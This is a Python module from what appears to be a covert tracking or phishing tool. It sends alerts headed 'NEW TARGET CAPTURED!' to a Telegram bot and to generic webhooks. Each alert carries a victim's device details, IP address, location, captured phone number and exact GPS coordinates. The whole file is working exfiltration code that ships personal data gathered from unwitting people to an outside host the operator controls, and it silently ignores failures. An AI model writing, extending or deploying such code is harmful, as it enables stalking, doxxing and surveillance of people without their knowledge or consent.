import os
import httpx
from typing import Dict, Any

WEBHOOK_URL = os.getenv("WEBHOOK_URL", "")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")


async def send_webhook_notification(log_entry: Dict[str, Any]):
    """
    Sends real-time capture alerts to Telegram or generic Webhooks (e.g. Discord, Make, Zapier).
    """
    # 1. Telegram Notification
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        try:
            device = f"{log_entry.get('device_brand', '')} {log_entry.get('device_model', '')}".strip() or "Unknown Device"
            loc = f"{log_entry.get('city', '')}, {log_entry.get('country', '')}".strip(" ,") or "Unknown"
            ip = log_entry.get("ip_address", "—")
            phone = log_entry.get("captured_phone")
            gps_lat = log_entry.get("gps_lat")
            gps_lng = log_entry.get("gps_lng")

            msg = f"🚨 *NEW TARGET CAPTURED!*\n\n"
            msg += f"📱 *Device:* {device}\n"
            msg += f"🌐 *IP:* `{ip}`\n"
            msg += f"📍 *Location:* {loc}\n"
            
            if phone:
                msg += f"📞 *Phone Captured:* `{phone}`\n"
            if gps_lat and gps_lng:
                msg += f"🎯 *Exact GPS:* [{gps_lat}, {gps_lng}](https://maps.google.com/?q={gps_lat},{gps_lng})\n"
            else:
                msg += f"🔵 *Precision:* IP Geolocation (ISP Hub)\n"

            telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            async with httpx.AsyncClient(timeout=4.0) as client:
                await client.post(telegram_url, json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": msg,
                    "parse_mode": "Markdown",
                    "disable_web_page_preview": False
                })
        except Exception as e:
            pass

    # 2. Generic HTTP Webhook (Discord / Custom API)
    if WEBHOOK_URL:
        try:
            async with httpx.AsyncClient(timeout=4.0) as client:
                await client.post(WEBHOOK_URL, json=log_entry)
        except Exception as e:
            pass
